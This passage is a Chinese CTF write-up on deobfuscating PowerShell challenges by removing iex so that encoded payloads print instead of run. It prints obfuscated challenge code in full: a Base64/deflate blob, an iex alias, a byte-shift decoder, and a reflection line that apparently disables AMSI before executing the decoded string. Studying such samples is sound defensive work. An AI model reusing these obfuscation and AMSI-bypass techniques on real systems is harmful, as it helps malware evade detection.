</div><p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015225956403.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015225956403.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015225956403.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015225956403.png?size=large 2x" sizes="auto" data-title="image-20231015225956403" data-alt="image-20231015225956403" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>这里发现最后的管道符连接着一个( $EnV:COMsPEC[4,26,25]-JoiN&rsquo;&rsquo;)，经过直接执行后发现是iex命令。查看资料和发现，iex会直接将输入当作命令执行。因此我们看不到字符的输出。这里我们需要将其去掉，去掉之后，为了输出后面的字符（应该很容易看出来前面是字符的加加减减），在开头加入<code>write-output</code>再执行脚本。</p>
<div class="highlight" id="id-21"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">write-output (&#39;w&#39;+(&#34;{0}{1}&#34; -f &#39;yes&#39;,&#39;us&#39;)+&#39;c&#39;+&#39;tf&#39;+&#39;{Pow&#39;+(&#34;{1}{0}{2}&#34; -f&#39;shel&#39;,&#39;er&#39;,&#39;l&#39;)+&#39;_&#39;+&#39;i&#39;+(&#34;{0}{1}&#34;-f&#39;sss&#39;,&#39;s&#39;)+&#39;ss&#39;+(&#34;{2}{0}{1}&#34; -f &#39;s&#39;,&#39;sss_v&#39;,&#39;ss&#39;)+(&#34;{1}{2}{0}&#34;-f &#39;_ez_f&#39;,&#39;err&#39;,&#39;y&#39;)+&#39;o&#39;+&#39;rrr&#39;+&#39;r&#39;+&#39;rr&#39;+&#39;r&#39;+&#39;r_you}&#39;+(&#34;{1}{0}&#34; -f &#39;zZRout&#39;,&#39;wye&#39;)+(&#34;{0}{1}&#34;-f&#39;-nul&#39;,&#39;l&#39;)).REPLAce(&#39;zZR&#39;,[StRing][CHAR]124).REPLAce(([CHAR]119+[CHAR]121+[CHAR]101),[StRing][CHAR]34)</span></span></code></pre></td></tr></table>
</div>
</div><p>执行结果如下：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015232050608.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015232050608.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015232050608.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015232050608.png?size=large 2x" sizes="auto" data-title="image-20231015232050608" data-alt="image-20231015232050608" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>开始时没发现这个out-null哈哈哈似乎也需要去掉，但是还好不影响输出答案。</p>
<h2 id="0x03-powershell">0x03 PowerShell</h2>
<p>这题就复杂多了。只能从能入手的地方入手（题目太长，不放进来了）</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015232610521.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015232610521.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015232610521.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015232610521.png?size=large 2x" sizes="auto" data-title="image-20231015232610521" data-alt="image-20231015232610521" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>首先从开头的地方就可以发现两个加密：一个是Base64，一个是deflatestream。虽然第二个加密不太了解，但是发现cyberchef上有相应的解密过程。</p>
<p>接着就是一大堆加密后的文字。在文件最后还有这些命令：</p>
<div class="highlight" id="id-22"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">[</span><span class="no">IO.comPResSIoN.coMpReSsiONmoDe</span><span class="p">]::</span><span class="n">DeComPrESs</span> <span class="p">)|</span> <span class="p">%{</span><span class="nb">New-ObjEct</span>  <span class="n">Io</span><span class="p">.</span><span class="py">StrEamreadEr</span><span class="p">(</span> <span class="nv">$_</span> <span class="p">,[</span><span class="no">SysTem.Text.ENcODiNg</span><span class="p">]::</span><span class="n">AsCIi</span><span class="p">)}).</span><span class="py">ReadtOEND</span><span class="p">(</span> <span class="p">)</span> <span class="p">|&amp;((</span><span class="nb">gV </span><span class="s1">&#39;*MDr*&#39;</span><span class="p">).</span><span class="n">nAME</span><span class="p">[</span><span class="mf">3</span><span class="p">,</span><span class="mf">11</span><span class="p">,</span><span class="mf">2</span><span class="p">]</span><span class="n">-JoIn</span><span class="s1">&#39;&#39;</span><span class="p">)</span></span></span></code></pre></td></tr></table>
</div>
</div><p>这里只看出来是ascii加密，还有一个iex，前面的不清楚有什么用处。反正iex要删掉的，我决定先去看看加密的地方有什么。</p>
<div class="highlight" id="id-23"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">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</span></span></code></pre></td></tr></table>
</div>
</div><p>先base64，再inflate，得到以下代码：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015233615158.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015233615158.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015233615158.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015233615158.png?size=large 2x" sizes="auto" data-title="image-20231015233615158" data-alt="image-20231015233615158" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<div class="highlight" id="id-24"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">set-alias -Name httpCurl -Value iex;[Byte[]]$c = [System.Convert]::FromBase64String(&#39;BSQiIklEakUoWC0nLCwnLlZASFxJKSQiJW0/aCUiG0BHXTxkTTxxIyMbKXckGyQbJBskNCssJysrLSc0MSwnLzEnMS4nMTAnLi4sJy4vLCcxMywnNC0tJy4rLScxLicuLS0nKzAnMi4sJy0vGxtAZigbG2JpRG1vbkBNcF5gTihqT09tYHFpaj53Ijg8YlU8Xj88Yz1MSjxMPzx1PGJUPDw/PGQ9clQ8PD88dDxiSDxEPzxkPUxIPEg/PCw8PEk8VD88dDxySDxMPzxjPTxKPEA/PHM8TFU8RD88aD1iSDxMPzxnPUxJPFA/PHI8PEg8TD88LDw8STxMQjwsPHJIPF4/PC48PEg8PD88KzxiSTxePzxlPTxIPGI/PHQ8Ykk8SD88MDxySTxmPzwrPDxVPFA/PGY9PEo8Yj88Zj1MSjw8PzxzPDxVPERCPHM8PFU8REI8LDxiSDxMQjwvPExKPGY/PHU8PEo8Zj88ZD1MSTxIQjxjPUxKPGY/PGU9ckg8TEI8ZT08SDxQQjxnPTxKPFQ/PGM9YlQ8QD88Yz1MVTxmPzxlPTxJPEQ/PGU9ckg8VD88ZT08VTxMPzxzPHJJPFRCPGc9TEk8Zj88dTxiSTxEPzwtPHJIPFQ/PGY9PEo8REI8Zz1ySTxUQjxkPWJJPEA/PGU9Ykg8UEI8KzxMVDxAQjwwPDxKPEA/PCw8TFQ8Xj88dTxiSDxiPzxnPXJUPERCPDA8Ykg8RD88LTxySDxEPzx1PExKPGI/PGQ9TEo8TD88LDxySDxQQjxjPXJJPEhCPHQ8TEg8QD88LTxiSTxePzwrPHJJPF4/PCw8ckk8QD88KzxMSDxIPzxyPDxKPFBCPDA8clQ8PD88Kzw8SDxAPzx1PExIPDw/PHQ8TEo8SD88ZT1ySTxAPzwvPDxJPEQ/PCs8Ykk8REI8Yz1MSDxMQjxyPDxVPEw/PCs8TFQ8PD88Zj08VTw8PzwrPExJPEg/PGY9ckg8PD88ZD08STxQQjxyPExVPGY/PGY9clQ8QD88LDxiVDxMPzwvPGJUPEQ/PC08TFQ8REI8Lzw8SDxIPzwvPDxJPEA/PC48PEo8RD88LDw8STxEPzwrPExKPEBCPDA8TFU8Xj88KzxiSTxmPzx1PGJJPFA/PCs8PEo8SEI8ZD1iVDxIPzx1PDxVPEhCPGg9TEo8Zj88KzxySTxIQjxyPDxKPGI/PHQ8TEg8VD88ZD1iSTxePzxyPDxIPFQ/PCs8PEo8Xj88Zz1MVTxMQjwrPExJPExCPC88TFQ8VEI8dTxiSDw8PzwrPGJVPFRCPGM9TFU8UD88dTxMVDxQQjxkPWJJPFBCPDA8PEk8SEI8MDxMSTxIQjxlPUxVPExCPGU9ckg8Xj88cjxiSTxIQjx0PDxJPERCPHI8YlQ8Yj88LzxiVTxUPzwwPGJVPFBCPCw8TEo8QEI8MDw8SDxEPzwwPGJVPEhCPGU9TFU8Yj88LDxiVDxMPzxoPXJUPFRCPC88TEg8PD88Yz1ySTxUQjwuPHJUPFQ/PC08PEg8VD88aD1MVDxQPzx1PDxKPFQ/PDA8TEg8Yj88LjxMSjxAQjxmPTxIPFQ/PC88YlU8UEI8Yz08VTxUQjxjPXJIPEw/PCs8TFU8SD88ZT1MSjxMQjxmPXJUPEhCPC88TFQ8QD88MDw8SDxiPzx0PDxJPExCPCs8TEo8REI8LjxiVTxUQjx1PDxVPEBCPCs8ckg8TD88LjxiSTw8PzwuPDxKPGI/PHQ8Ykk8Zj88dDxiVTxMPzxmPWJVPGI/PHI8Ykg8TEI8Lzw8SjxIPzxjPXJIPEhCPHM8YlU8QEI8ZD1iSTxQQjx0PGJJPGI/PGY9TEk8SEI8czxMVTxQQjwsPGJUPFBCPHQ8TFU8UD88cjw8SDxiPzx1PGJIPEQ/PGY9Ykg8SD88dTxiSTxAPzxnPUxIPERCPC48YlU8QD88ZD08STxMQjwwPExJPFBCPGc9ckg8QEI8Zj1iVTxePzxnPXJIPEBCPHQ8YlU8TD88Zz1MSDw8PzxnPTxVPDw/PGc9Ykk8VD88Yz08SDxiPzx1PExVPDw/PCw8PEo8VD88dTw8STw8PzwuPDxKPFQ/PGg9Ykk8VD88aD1MVTxIQjx1PExKPEA/PC48TEk8REI8dDw8STxQQjwrPDxKPEQ/PGM9PEg8Xj88LTxiSDxIQjwuPHJIPEw/PHU8TFU8Xj88LzxyVDw8PzxkPWJUPFRCPC48YlQ8VEI8LDxiSDxIQjwwPGJUPERCPHQ8clQ8UEI8czxMVDxUQjwtPDxVPEg/PGM9clQ8UEI8Zz1iSDxiPzwuPExUPDw/PCw8ckk8VD88dDw8SDxUQjwwPDxKPFRCPGg9TEo8Xj88ZD08STxEPzxnPTxJPDw/PGc9YlU8REI8dTxySTxUQjxlPTxJPGI/PGg9clQ8Yj88LjxiVTxePzxnPXJIPEg/PHI8PEo8Yj88Lzw8VTxQQjxkPWJJPEBCPC08TEo8UD88LzxySDxMQjxmPUxUPExCPGY9Ykk8TD88MDxMSTxAQjxyPGJVPExCPHU8TEg8TD88dTxiVDxAPzwvPExVPFA/PC88TFQ8VEI8LjxMSDxQPzwtPDxJPEhCPGU9TEo8TD88LDxyVDxEPzwvPExIPEg/PHU8PFU8QEI8MDw8SjxQPzx0PHJJPGI/PGY9TEg8TD88dDw8STxePzxmPWJVPExCPGY9Ykk8SEI8cjw8SjxQQjwuPGJIPEA/PHQ8YlQ8SD88LTxMVTxUQjwsPExIPFQ/PHI8PEo8Xj88LzxMVTxIQjwsPExJPERCPGM9Ykg8VEI8ZD1MSjxQPzxyPExJPEBCPGg9ckg8SD88ZD1iVDxEQjwrPGJVPEBCPGQ9PEk8UEI8Yz08SDxAPzxzPHJUPGY/PHI8YlQ8QD88dDxMSDxiPzwwPHJUPFBCPC88Ykk8QD88aD1ySDxiPzxjPWJVPEQ/PC48PEk8Yj88dTxMSTxUPzxyPExVPEBCPHI8clQ8PD88ZD1iSDw8PzxzPHJJPDw/PGU9TFQ8REI8LTxyVDxMQjxyPDxJPEQ/PGU9ckg8VEI8dTxMSjxMQjxoPTxIPEA/PC08PEk8Yj88KzxyVDxIQjxoPUxKPExCPHQ8TEo8UEI8cjxySTxAQjxzPGJVPEQ/PHM8ckk8SD88LzxMSDxiPzx0PDxJPEBCPHQ8clQ8PD88dTxMSTxiPzxzPHJUPEhCPCw8ckg8Xj88dDxMSDxmPzx1PExJPF4/PCw8ckk8Yj88LDxiSTxMQjwvPDxJPExCPHI8PEg8QEI8Yz1MVDxePzxlPTxKPEQ/PHU8ckk8REI8ZD1ySTxMQjx0PGJIPExCPC08YlQ8VEI8Yz1ySTxmPzxnPUxJPGY/PGQ9TEo8SD88Zj1ySDxAQjxlPTxKPFBCPHM8PEg8UD88MDw8VTxMPzx0PDxIPEQ/PHM8PEo8RD88Yz1MVTxmPzwtPGJUPEA/PGM9YlU8PD88ZT1yVDxQQjwsPDxIPEw/PGg9Ykg8QD88Zz1iVDxUPzx0PExIPGY/PCs8ckg8UD88MDxiVTxEPzxkPTxVPGY/PGg9YlU8SEI8ZT1iSTxAPzwtPGJJPFA/PGU9TEo8UD88ZT1MSjxAPzxnPTxIPDw/PGM9TEg8Zj88LTxMSTxIPzxjPWJIPFBCPC48YlQ8SD88aD1MSjxAPzxyPGJIPERCPGc9TEk8QEI8Zz08SDxmPzwuPExIPERCPCw8PFU8REI8aD1MSjxAPzxmPUxUPEBCPCw8Ykg8UEI8aD08STxmPzxyPDxIPFQ/PGU9TEg8REI8LTxMVTxmPzxmPWJVPDw/PC88ckk8Yj88LjxySDxAPzxjPWJJPEQ/PGQ9TEo8RD88cjxMSTxmPzwrPDxVPExCPCs8ckg8QD88ZD1MSjxUQjwwPDxVPFA/PC48Ykk8SD88Kzw8SjxMPzxyPGJIPDw/PC88PEg8VD88Zz08SDw8Pzx1PGJVPEBCPHM8ckk8RD88czxMVDxIQjxkPUxJPFA/PGU9Ykg8QD88cjxMVTxIPzxzPHJJPExCPCs8ckk8VD88Zj1iVDxIQjx0PHJIPERCPGc9TFQ8Zj88czw8STxQQjwrPDxVPF4/PCs8TEg8TD88czxySTxUQjxmPWJVPGY/PC48ckg8PD88aD08VTxQPzx1PHJJPEw/PGY9ckk8Xj88MDxySTxAQjwvPHJIPDw/PHM8TEg8TEI8LzxiVTxEPzwuPExUPEA/PGM9ckk8Yj88KzxiVDxMPzxyPDxKPGY/PGg9ckk8UEI8Zj1MSTxePzx0PHJJPEA/PGQ9ckg8PD88czxiVTxQQjwrPHJJPFBCPGg9PEg8VEI8LTxiSDxEQjwtPDxVPExCPHU8PEo8UEI8Zj1MVDw8PzwwPHJIPFBCPGg9YlQ8QD88aD1MVTxMPzxyPHJUPEA/PC88TEk8UEI8aD1MVDxMPzxjPXJIPERCPC08clQ8UEI8czxiSDxMQjwwPHJJPEg/PC48PEk8ckM8NDxMSzxAQDw9PWJQPERCPGM9PFU8UEE8MDxyTzxUQDxxPExOPHJCPEc9Yl48QEA8MD1iUjxuQjxzPExSPGJCPDM9YkgwLy4wXCswKzEsXS4sLy4tLythLi8yMSwsLF8tNC8xMiIjHyNEbmk8PkpHZ1xnXD1qR0JKT2JJRG1PbmBtcF5AbjU1WEc8Q25tPEgpbmA+ZFFNQG5ram1AT2lEKWBoZG9JcG1WI2ROaVxCaURtb25KT21PSzU1WGc8Y25tPEgpTkA+RFFNYE5rak1gb2lkKUBoZG9pUE1WGyM=&#39;);[Byte[]]$d = [System.Convert]::FromBase64String(&#39;amNga0xga&#39;+&#39;mQ4JWVmYGtYZGZrbDgl&#39;+&#39;a2VcZFxeWGVYRCVkXGtqcEo=&#39;);[Byte[]]$e = [System.Convert]::FromBase64String(&#39;W1xjY&#39;+&#39;Fg9a2BlQGBqZFg=&#39;);[Byte[]]$f = [System.Convert]::FromBase64String(&#39;XGlmO&#39;+&#39;iVkXGtqcEo=&#39;);[Byte[]]$g = [Convert]::FromBase64String(&#39;aVxbYG1ma&#39;+&#39;UdrZVxtPCVeZWBrZVxtPCVqW&#39;+&#39;mBramZlXlhgOyVkXGtqcEo=&#39;);[Byte[]]$h = [System.Convert]::FromBase64String(&#39;W1xjW&#39;+&#39;VhlXFZk&#39;);[Byte[]]$i = [Convert]::FromBase64String(&#39;aVxbYG1maUde&#39;+&#39;ZkNuazxKRyVeZWBaWGlLJWV&#39;+&#39;mYGtYZGZrbDgla2VcZFxeWGVYRCVkXGtqcEo=&#39;);[Byte[]]$j = [Convert]::FromBase64String(&#39;aVxbY&#39;+&#39;G1maUdua1w=&#39;);function A ([Byte[]]$v,[Int]$n){[Byte[]]$t = $v.clone();Set-Variable -Value (1) -Name aaa;for (Set-Variable -Value (0) -Name x; $x -lt $v.Count; $x++) {Set-Variable -Name aaa -Value (2);$t[$v.Count-$x-1] = $v[$x] + $n;}return $t;}Set-Variable -Name y -Value (1);while($y -gt 0){Set-Variable -Name c -Value (A($c)(5));Set-Variable -Value (A($d)(9)) -Name d;Set-Variable -Value (A($e)(9)) -Name e;Set-Variable -Value (A($f)(9)) -Name f;Set-Variable -Value (A($g)(9)) -Name g;Set-Variable -Value (A($h)(9)) -Name h;Set-Variable -Value (A($i)(9)) -Name i;Set-Variable -Value (A($j)(9)) -Name j;Set-Variable -Name y -Value ($y - 1);}Set-Variable -Name cccccc -Value ([System.Text.Encoding]::ASCII.GetString($c));[Ref].Assembly.GetType([Text.Encoding]::ASCII.GetString($d)).GetField([Text.Encoding]::ASCII.GetString($e),&#39;NonPublic, Static&#39;).SetValue($null, $true);if($y -lt 1000){httpCurl($cccccc);}</span></span></code></pre></td></tr></table>
</div>
</div><p>代码太多了，但是中间大部分都是base64的加密码。由于数量太多，我的想法是让它自己解密。方法就是去掉iex执行就可以。（就是得到本来的字符串，而不当作命令执行）。</p>
<p>阅读代码发现第一行<code>set-alias -Name httpCurl -Value iex;</code>语句将httpCurl设置为iex的别名，这里我们在脚本中找到后将其去除：</p>
<p><img loading="lazy" src="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015234057341.png" srcset="https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015234057341.png?size=small, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015234057341.png?size=medium 1.5x, https://cdn.jsdelivr.net/gh/thecoderalex/imgs@upload/2023/image-20231015234057341.png?size=large 2x" sizes="auto" data-title="image-20231015234057341" data-alt="image-20231015234057341" style="background: url(/svg/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;this.alt=this.dataset.alt;for(const i of ['style', 'data-title','data-alt','onerror','onload']){this.removeAttribute(i);}"/></p>
<p>发现这里包裹着<code>$cccccc</code>变量，这里我们肯定不能将变量一起删了。就在上一行，我们发现cccccc也是别名：</p>
<div class="highlight" id="id-25"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="nb">Set-Variable</span> <span class="n">-Name</span> <span class="n">cccccc</span> <span class="n">-Value</span> <span class="p">([</span><span class="no">System.Text.Encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="p">.</span><span class="py">GetString</span><span class="p">(</span><span class="nv">$c</span><span class="p">));</span></span></span></code></pre></td></tr></table>
</div>
</div><p>那干脆把这个别名也去了，将<code>([System.Text.Encoding]::ASCII.GetString($c))</code>，放入最后的<code>if</code>语句中：</p>
<div class="highlight" id="id-26"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="k">if</span><span class="p">(</span><span class="nv">$y</span> <span class="o">-lt</span> <span class="mf">1000</span><span class="p">){[</span><span class="no">System.Text.Encoding</span><span class="p">]::</span><span class="n">ASCII</span><span class="p">.</span><span class="py">GetString</span><span class="p">(</span><span class="nv">$c</span><span class="p">);}</span></span></span></code></pre></td></tr></table>
</div>
</div><p>此时这个文件应该没有iex了，运行一下试试看：</p>
